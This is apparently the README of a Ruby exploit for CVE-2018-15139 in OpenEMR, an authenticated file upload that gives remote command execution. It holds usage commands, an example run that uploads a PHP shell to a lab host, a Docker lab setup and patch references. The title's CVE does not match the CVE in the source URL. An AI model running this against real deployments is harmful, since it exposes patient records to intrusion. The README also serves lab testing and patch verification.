# OpenEMR CVE-2018-15139 exploit

> OpenEMR < 5.0.1.4 - (Authenticated) File upload - Remote command execution

Exploit for [CVE-2018-15139][CVE-2018-15139].

## Usage

```
$ ruby exploit.rb -h
OpenEMR < 5.0.1.4 - (Authenticated) File upload - Remote command execution

Source: https://github.com/sec-it/exploit-CVE-2019-14530

Usage:
  exploit.rb exploit <url> <filename> <username> <password> [--debug]
  exploit.rb -h | --help

Options:
  <url>       Root URL (base path) including HTTP scheme, port and root folder
  <filename>  Filename of the shell to be uploaded
  <username>  Username of the admin
  <password>  Password of the admin
  --debug     Display arguments
  -h, --help  Show this screen

Examples:
  exploit.rb exploit http://example.org/openemr shell.php admin pass
  exploit.rb exploit https://example.org:5000/ shell.php admin pass
```

## Example

```
$ ruby exploit.rb exploit http://172.24.0.3 agent.php admin pass
[+] File uploaded:
http://172.24.0.3/sites/default/images/agent.php
```

## Requirements

- [httpx](https://gitlab.com/honeyryderchuck/httpx)
- [docopt.rb](https://github.com/docopt/docopt.rb)

Example using gem:

```bash
bundle install
# or
gem install httpx docopt
```

## Docker deployment of the vulnerable software

Warning: of course this setup is not suited for production usage!

```
$ sudo docker-compose up
```

The upload folder permissions are broken in the official OpenEMR docker image, so it is required to connect to the container and fix the permissions, eg.:

```
$ sudo docker exec -ti exploit-cve-2018-15139_openemr_1 /bin/sh
$ chmod u+w /var/www/localhost/htdocs/openemr/sites/default/images/
```

## References

- Target software: **OpenEMR**
  - Homepage: https://www.open-emr.org/
  - Source: https://github.com/openemr/openemr
  - Docker: see `docker-compose.yml`
  - Vulnerable version: < 5.0.1.4 (it means up to 5.0.1.3)
  - Patch: https://github.com/openemr/openemr/pull/1757/commits/c2808a0493243f618bbbb3459af23c7da3dc5485

This is a better re-write [EDB-49998][EDB-49998].

The vulnerability was found by [Project Insecurity](https://insecurity.sh/).

Analysis of the original exploit and vulnerability:

- [OpenEMR patches serious vulnerabilities uncovered by Project Insecurity](https://www.databreaches.net/openemr-patches-serious-vulnerabilities-uncovered-by-project-insecurity/)

[EDB-49998]:https://www.exploit-db.com/exploits/49998
[CVE-2018-15139]:https://nvd.nist.gov/vuln/detail/CVE-2018-15139
